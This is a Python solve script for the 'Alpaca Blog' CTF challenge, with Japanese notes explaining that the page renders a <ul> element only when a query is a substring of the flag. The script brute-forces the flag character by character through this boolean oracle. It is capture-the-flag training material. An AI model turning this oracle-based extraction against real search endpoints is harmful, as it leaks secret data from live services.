"""Alpaca Blog

問題url: https://alpacahack.com/daily/challenges/alpaca-blog?month=2026-07

Note:
    app.py 44-45行目
    len(filtered) == 0 のとき、filtered=None となっている

    app.py 47行目
    len(filtered) != 0 のとき、filtered は要素数0~4のリストになっている

    index.html 24行目
    {% if filtered is iterable %}
        <ul>
    となっており、filtered=None の場合は<ul>が表示されず、リストの場合は<ul>が表示される。
    
    <ul>が表示されていてその中身が空の場合は、それがflagの部分文字列になっている。
"""

import string

import requests

URL = "http://xxx"  # FIXME: challenge server URL


def get_request(query_str: str) -> requests.Response:
    """指定されたURLにGETリクエストを送信する"""
    res = requests.get(URL, params={"q": query_str}, timeout=10, allow_redirects=False)
    return res


def is_part_of_flag(query_str: str) -> bool:
    """指定された文字列がフラグの一部かどうかを判定する"""
    res = get_request(query_str)
    return "<ul>" in res.text


if __name__ == "__main__":
    CHARSET = string.ascii_letters + string.digits + "_{}"
    flag = "Alpaca{"

    while not flag.endswith("}"):
        for ch in CHARSET:
            if is_part_of_flag(flag + ch):
                flag += ch
                print(flag)
                break
